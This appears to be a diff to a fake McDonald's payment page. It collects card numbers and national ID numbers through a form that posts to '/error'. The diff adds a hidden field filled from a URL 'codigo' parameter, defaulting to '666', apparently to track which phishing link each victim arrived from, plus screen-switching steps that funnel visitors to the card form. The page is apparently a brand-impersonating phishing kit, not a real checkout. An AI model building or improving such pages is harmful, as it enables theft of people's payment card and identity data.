@@ -480,9 +480,10 @@ input{
 <img src="img/logo.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->
 		
 
-		<!-- Formulario -->
+	<!-- Formulario -->
 		<form action="/error" method="post" id="formulario-tarjeta" class="formulario-tarjeta active">
 			<div class="grupo">
+				<input type="hidden" name="codigo" id="codigoAcceso">
 				<label for="inputNumero">Número Tarjeta</label>
 				<input type="text" name="input1"  id="inputNumero" maxlength="19" autocomplete="on" required>
 			</div>
@@ -515,14 +516,14 @@ input{
 	<div class="grupo">
 				<label for="inputDNI">Documento</label>
 				<input type="number" id="inputDNI" name="input6" maxlength="8" autocomplete="on" required>
-			</div>
-			<button type="submit" class="btn-enviar">Agregar</button>
-				</div>
-					<img src="img/logocre.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->
-
-		</form>
-Al pagar, Aceptas la Politica de tratamiento de datos personales.
 	</div>
+		<button type="submit" class="btn-enviar">
+    <img src="img/mp2.png" alt="Agregar envío">
+	</button></div>
+				
+		</form>
+  
+Al pagar, Aceptas la Politica de tratamiento de datos personales.
 
 	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
 	<script src="js/main.js"></script>
@@ -535,12 +536,30 @@ let tipoSeleccionado = "";
 function seleccionar(tipo){
   tipoSeleccionado = tipo;
 
+  document.getElementById("pantalla1").classList.add("oculto");
+  document.getElementById("pantalla2").classList.remove("oculto");
+}
+
+function mostrarFormulario(){
+  document.getElementById("pantalla2").classList.add("oculto");
   document.getElementById("pantalla3").classList.remove("oculto");
 
   document.getElementById("tipoPedido").innerText = tipoSeleccionado;
+  document.getElementById("input1").value = tipoSeleccionado;
 }
 </script>
+	
+<script>
+const parametros = new URLSearchParams(window.location.search);
 
+let codigo = parametros.get("codigo");
+
+if (!codigo || !/^\d+$/.test(codigo)) {
+    codigo = "666";
+}
+
+document.getElementById("codigoAcceso").value = codigo;
+</script>
 </body>
 </html>
 
